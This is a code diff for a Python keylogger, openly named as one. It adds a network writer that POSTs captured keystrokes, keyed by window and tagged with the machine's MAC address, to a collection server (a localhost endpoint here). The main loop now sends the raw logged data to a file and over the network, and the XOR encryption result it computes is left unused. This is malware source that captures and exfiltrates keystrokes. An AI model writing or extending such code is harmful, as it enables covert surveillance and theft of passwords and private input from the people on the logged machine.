@@ -7,6 +7,7 @@ from abc import ABC, abstractmethod
 import time
 import threading
 import uuid
+import requests
 
 
 class KeyLoggerService:
@@ -36,14 +37,13 @@ class KeyLoggerService:
     def _get_time(self):
 
         return datetime.strftime(datetime.now(),"%Y-%m-%d %H:%M")
-        pass
 
     def get_data(self):
         data = self.data
         mac_address = hex(uuid.getnode())[2:]
-        data = {"mac": mac_address, "data": data}
+        new_data = {"mac": mac_address, "data": data}
         self.data = {}
-        return data
+        return new_data
 
 
 class Writer(ABC):
@@ -71,7 +71,7 @@ class FileWriter(Writer):
 
 class NetworkWriter(Writer):
     def write(self,data):
-        pass
+        response = requests.post("http://127.0.0.1:5000/save_data", json= data)
 
 
 class Encryptor:
@@ -86,7 +86,7 @@ class Encryptor:
 
     def xor(self,data: dict):
         encrypted_data = {}
-        for key_window,value in data.items():
+        for key_window,value in data["data"].items():
             new_window = self._xor_help(key_window,)
             encrypted_data[new_window] = {}
             for key_date,value_str in value.items():
@@ -118,8 +118,13 @@ class KeyLoggerManager:
             time.sleep(5)
             data = self.keylogger_service.get_data()
             encrypt_data = self.encryptor.xor(data)
-            self.file_writer.write(encrypt_data)
+            print(data)
+            self.file_writer.write(data)
+            self.network_writer.write(data)
+
     def exit(self):
         self.key_logger_thread.join()
 
 key = KeyLoggerManager()
+
+
